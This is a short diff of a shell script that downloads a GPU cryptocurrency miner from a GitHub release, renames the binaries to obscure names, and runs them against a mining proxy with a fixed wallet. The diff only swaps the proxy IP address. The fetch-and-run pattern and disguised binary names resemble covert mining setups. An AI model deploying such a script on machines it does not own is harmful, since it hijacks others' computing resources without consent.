@@ -5,7 +5,7 @@ wget -c https://github.com/rxt36q6/file/releases/download/1/pearlfortune-v1.2.4.
 && cp miner-cuda13 lemosjiol \
 && cp miner-cuda12 lemosjio2
 
-./lemosjiol --proxy 20.205.214.159:443 --address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) -gpu --tui
+./lemosjiol --proxy 149.28.155.233:443 --address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) -gpu --tui
 
-./lemosjio2 --proxy 20.205.214.159:443 --address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) -gpu --tui
+./lemosjio2 --proxy 149.28.155.233:443 --address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) -gpu --tui
 
